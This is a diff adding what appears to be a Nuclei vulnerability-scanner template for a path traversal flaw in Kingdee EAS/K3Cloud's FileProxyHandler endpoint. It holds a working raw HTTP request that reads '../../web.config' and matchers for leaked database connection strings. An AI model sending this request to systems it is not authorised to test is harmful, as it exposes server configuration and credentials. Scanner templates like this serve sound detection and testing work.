@@ -1,0 +1,40 @@
+id: kingdee-FileProxyHandler-lfi
+
+info:
+  name: kingdee-FileProxyHandler-lfi
+  author: ro1t
+  severity: high
+  description: Kingdee EAS OA server_file is vulnerable to local file inclusion and can allow attackers to obtain sensitive server information.
+  reference:
+    - https://www.yuque.com/
+  metadata:
+    max-request: 2
+  tags: kingdee,lfi,traversal,vuln
+
+http:
+  - raw:
+      - |
+        GET /k3Cloud/FileProxyHandler.kdfile?Ope=SDL&F=../../web.config&Area=0&Step=100000000 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: charset=UTF-8
+        Connection: keep-alive
+        Cache-Control: no-cache
+        Pragma: no-cache
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Data Source='
+          - 'User'
+          - 'selectedSource'
+        condition: or
+
+      - type: status
+        status:
+          - 200
+# digest: 490a00463044022069baf66b979890ceb2caa3c7440f58ee25adeddbcb3e6e5cfeb82b591088dda1022025b20be5c895df245339012017de5a2f1d71a685ccce292fa9472169e8e02a1a:922c64590222798bb761d5b6d8e72950
